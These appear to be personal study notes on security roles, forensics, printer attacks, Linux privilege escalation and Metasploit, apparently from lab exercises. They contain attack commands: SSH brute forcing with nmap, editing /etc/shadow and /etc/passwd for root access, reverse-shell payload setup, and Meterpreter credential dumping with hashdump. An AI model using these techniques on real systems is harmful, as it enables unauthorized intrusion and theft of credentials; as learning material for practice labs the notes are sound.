# Notes

**offensive security**

Look for vulnerabilities, recommend patches. Exploiting bugs. Finding loopholes. Gain unauthorized access.

* **penetration tester**: "Responsible for testing technology products for finding exploitable security vulnerabilities." (web security, network security knowledge, use various programming languages, cloud security)
* **Red Teamer**: "Plays the role of an adversary, attacking an organization and providing feedback from an enemy's perspective."
* **Security Engineer**: "design, monitor, and maintain security controls, networks, and systems to help prevent cyberattacks".

**defensive Security**. 
  * **Security Analyst** (monitor - splunk?)
  * **Incident Responder** (impact? goal? what can they do? - Volatility?)
  * **malware analysis**

Detect, and stop attacks. Monitor, analyze. Investigate infected computers, try to find how they were hacked, track down cybercriminals.

* Linux security researcher > Hashing


Other

* https://www.hackerrank.com/

<hr class="sep-both">

## Random

* Attack a vulnerable machine, scan the network to discover more vulnerable machines.

* find "password" in some conversations > try to get access to some stuff with it

* Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.

<hr class="sep-both">

## Tools

* The [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists/) contains useful lists of usernames/passwords, payloads, urls, ...

<hr class="sep-both">

## Linux

* python3 -m  http.server: start web server, was used to open a "root" file without perms
* `cron` process to schedule tasks, with `crontabs` (file)
  * ...
  * Automated tasks in Linux
  * https://crontab-generator.org/
  * https://crontab.guru/
  * edit `crontab -e`
* Logs
  * `/var/log`
    * ufw: firewall
    * apache
    * fail2ban

<hr class="sep-both">

## Forensics

"You need to understand a website, to find weakness, and process hacking a website."

https://tryhackme.com/room/introdigitalforensics

Forensics is the application of science to investigate crimes and establish facts -> digital forensics. Digital forensics is used in two types of investigations:

* Public-sector investigations (gov, law enforcement)
* Private-sector investigations (hired by companies)

---------

pdfinfo DOCUMENT.pdf
sudo apt install poppler-utils
Open in edge -> details.

------

Images.

* Camera model / Smartphone model
* Date and time of image capture
* Photo settings such as focal length, aperture, shutter speed, and ISO settings
* GPS coordinates (if there is a GPS sensor)

exiftool. ExifTool is used to read and write metadata in various file types, such as JPEG images.

sudo apt install libimage-exiftool-perl

https://jimpl.com/
https://www.geekyhumans.com/tools/image-metadata-viewer

<hr class="sep-both">

## IPP - (TCP/631)

"The Internet Printing Protocol (IPP) - is a specialized Internet protocol for communication between client devices and printers. It allows clients to submit one or more print jobs to the printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or canceling individual print jobs."

If open to the internet, everyone can print, or use it as a middleman for attacks.

https://www.variot.eu/

"An open IPP port can expose a lot of sensitive information such as printer name, location, model, firmware version, or even printer wifi SSID."

* https://github.com/RUB-NDS/PRET
* pip install colorama pysnmp

```bash
$ python pret.py
# look for printers
$ python pret.py file.lan ps # test language postscript
$ python pret.py <ip> pjl # Printer Job Language
$ python pret.py /dev/usb/lp0 pcl # Printer Command Language
```

http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet

PRET isn't going to work here as it is using port 9000 by default

* Brute force ssh password `nmap <MACHINE_IP> -p 22 --script ssh-brute --script-arg userdb=user.txt`
* `http://ip:631/printers/`

<hr class="sep-both">

## Privilege escalation

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://payatu.com/guide-linux-privilege-escalation
* https://www.udemy.com/course/linux-privilege-escalation/

Services

* https://www.exploit-db.com/exploits/1518
  * use mysql with root and no password, to create a root shell, using some C code.

Weak perms

* /etc/shadow
  * if "r": try bruteforce 
  * if "w": `mkpasswd -m sha-512 newpasswordhere` then edit
* /etc/passwd
  * some old Linux allow us to replace "x" with a password (`openssl passwd newpasswordhere`)
* `sudo -l`: see what I can run with sudo, https://gtfobins.github.io/
* https://github.com/TH3xACE/SUDO_KILLER
* https://blog.certcube.com/linux-privilege-escalation-with-sudo-rights/
* https://gtfobins.github.io/
* If env variables are loaded, you may exploit them too.

Maybe not really useful, but with `bash script.sh`, you can execute without having the permission `x`.

<hr class="sep-both">

## Bunch

* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* Metasploit
  * https://www.youtube.com/watch?v=kdtMthVeC1M
* Wireshark: https://unit42.paloaltonetworks.com/wireshark-workshop-videos/

"IEUser" / "Passw0rd!"
90 days.
https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

Sudo flaw
https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html

* XP
  * https://helpdeskgeek.com/virtualization/how-to-set-up-a-windows-xp-virtual-machine-for-free/
  * https://helpdeskgeek.com/virtualization/virtualbox-share-folder-host-guest/ sahre must be activated
  * Must be "bridge"?
* Exploit-db + others https://securitytrails.com/blog/top-exploit-databases

<hr class="sep-both">

## metasploit

* vm2
  * https://docs.rapid7.com/metasploit/metasploitable-2/
  * msfadmin:msfadmin
  * sudo loadkeys fr
  * VBox: use existing drive
  * C:\Program Files (x86)\VMware\VMware Player\OVFTool> .\ovftool.exe "Metasploitable.vmx"  "export.ovf"
  * https://windowsloop.com/convert-vmware-to-virtualbox/
  * 2 processors
  * https://www.vulnhub.com/entry/metasploitable-2,29/
  * File > Tools > Network manager (add)
    * add to each VM instead of Nat in network
* "Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:" `set payload windows/x64/shell/reverse_tcp`
* https://help.tryhackme.com/106141-openvpn/606073-openvpn-general-troubleshooting
* `set LHOST tun0`
* `auxiliary/scanner/smb/smb_ms17_010` to verify that it is vulnerable
  * Modules
    * Encoders
    * Evasion
    * Exploits
    * NOPs
    * Payloads
      * single/inline: generic/shell_reverse_tcp
      * not inline= staged: shell"/"reverse_tcp
    * Post
* `show payloads`
* `set payload 1`
  * Payloads are the code that will run on the target.
* `debug`
* `help set`
* `history`
* "the tab key"
* see required options
* back...
* info

![](_images/img.png)

* https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
* search type:auxiliary platform:
* mfs ex> (context prompt)
* meterpreter> (the Meterpreter prompt)
* unset all
* unset xxx
* setg used in all modules
* `exploit -z` in the background
* check: check if exploitable, if supported
* background/CTRL+Z to background sessions
  * sessions
  * sessions -i <id>
* shell to meterpreter (seems useless in msf6)
  * `post/multi/manage/shell_to_meterpreter`
  * session
  * `shell`
    * `whoami`
  * `getsystem`
  * `sysinfo`
  * `ps` find NT AUTHORITY\SYSTEM and migrate to it -> `migrate pid`
  * `hashdump`
    * username
    * rid
    * LM hash
    * NTML hash - decrypt this (john nt)
  * `getuid`
  * https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
  * Capture: https://www.offensive-security.com/metasploit-unleashed/screen-capture/
  * https://www.offensive-security.com/metasploit-unleashed/Keylogging/
* KeyLocations Windows
  * Root (cd /)
  * Documents
  * Windows/System32/config/ (sam database - where password are stored)

<hr class="sep-both">

## Nmap

* sudo systemctl start postgresql
* sudo msfdb init
  * I got some error, but it works
  * you need to restart msf
  * `db_status
    [*] Connected to msf. Connection type: postgresql.`
* https://www.offensive-security.com/metasploit-unleashed/using-databases/
* https://scubarda.com/2015/11/16/launching-nessus-scans-inside-metasploit/
  * `load nessus`
  * `nessus_connect user:pass@localhost:8834`
  * `nessus_scan_list`
  * `nessus_db_import id`
  * `services`
  * `vulns`
  * `vulns -s ftp`
  * `vulns -S keyword`
* https://www.techtalk7.com/detect-if-running-with-administrator-privileges-under-windows-xp/
* https://www.offensive-security.com/metasploit-unleashed/working-with-nessus/
  * MS09-050
  * search exploits 09-050
* https://tryhackme.com/resources/blog/metasploit
* `-j REJECT --reject-with tcp-reset`